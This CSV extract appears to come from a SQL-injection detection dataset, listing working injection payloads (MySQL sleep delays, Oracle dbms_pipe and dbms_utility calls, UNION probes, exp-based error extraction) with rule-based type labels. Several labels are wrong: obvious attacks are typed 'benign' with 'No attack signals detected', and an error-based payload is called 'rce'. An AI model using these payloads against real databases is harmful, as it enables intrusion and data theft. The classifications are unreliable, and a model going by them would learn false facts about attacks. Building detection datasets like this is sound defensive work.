row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3300,"1"" ) as vpna where 5450 = 5450 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,5450 = 5450 or detected — boolean_blind injection (priority 8) on generic,rule-based
3301,1' rlike sleep ( 5 ) and 'gtfo' = 'gtfo,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3302,-8966%' or ( 7475 = 4014 ) *4014 and '%' = ',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3303,1 ) as sdnd where 9472 = 9472,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3304,1 ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 5368 = 5368,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
3305,"1%"" rlike sleep ( 5 ) and ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3306,"-9944"" ) ) or 8537 = 2039 and ( ( ""kfzj"" = ""kfzj",1,,boolean_blind,generic,0.95,8537 = 2039 and detected — boolean_blind injection (priority 8) on generic,rule-based
3307,"1%"" ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3308,"-3347'+ ( select xuzs where 1076 = 1076 union all select 1076,1076,1076,1076,1076--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3309,"1' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'lyem' like 'lyem",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3310,"-7764"" or 7308 = 7805",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3311,"1%' ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
